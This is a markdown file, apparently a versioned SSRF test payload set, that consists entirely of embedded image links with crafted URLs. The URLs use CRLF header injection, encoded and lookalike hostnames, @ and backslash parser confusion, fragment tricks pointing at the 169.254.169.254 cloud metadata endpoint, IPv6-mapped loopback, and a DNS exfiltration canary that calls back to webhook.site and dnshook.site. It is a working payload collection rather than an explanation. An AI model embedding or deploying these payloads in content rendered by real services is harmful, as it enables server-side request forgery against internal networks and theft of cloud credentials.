# SSRF v9 - Hostname Injection & Edge Cases

## Hostname with CRLF (via user:pass@)

![u1](https://admin:pass%0d%0aHost:%20127.0.0.1@webhook.site/u1.gif)

![u2](https://user%0d%0aHost:%20internal:pass@webhook.site/u2.gif)

## Hostname with Encoded Characters

![h1](https://webhook%2esite/136e610f-df46-485b-b57e-d42604727ca2/h1.gif)

![h2](https://webhook．site/136e610f-df46-485b-b57e-d42604727ca2/h2.gif)

## @ Symbol Tricks

![at1](https://webhook.site@evil.com/136e610f-df46-485b-b57e-d42604727ca2/at1.gif)

![at2](https://evil.com%40webhook.site/136e610f-df46-485b-b57e-d42604727ca2/at2.gif)

## Backslash Confusion

![bs1](https://webhook.site\@127.0.0.1/136e610f-df46-485b-b57e-d42604727ca2/bs1.gif)

![bs2](https://webhook.site%5c@127.0.0.1/bs2.gif)

## IDN/Punycode Tests

![idn1](https://ⓦⓔⓑⓗⓞⓞⓚ.site/136e610f-df46-485b-b57e-d42604727ca2/idn1.gif)

## Fragment Identifier Tricks

![frag1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/frag1#@169.254.169.254/latest/meta-data/.gif)

![frag2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/frag2%23@internal/.gif)

## Port Tricks

![port1](https://webhook.site:80/136e610f-df46-485b-b57e-d42604727ca2/port1.gif)

![port2](https://webhook.site:443/136e610f-df46-485b-b57e-d42604727ca2/port2.gif)

![port3](https://webhook.site:8080/136e610f-df46-485b-b57e-d42604727ca2/port3.gif)

## IPv6 Tricks

![ipv1](https://[::ffff:7f00:1]/136e610f-df46-485b-b57e-d42604727ca2/ipv1.gif)

## URL with Tab/Space

![ws1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/ws1%09tab.gif)

![ws2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/ws2%20space.gif)

## Basic v9 Canary

![v9](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/v9-canary.gif)

## DNS Exfiltration v9

![dns1](https://v9-hostname-test.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns1.gif)

---

*v9: Hostname and edge case testing*
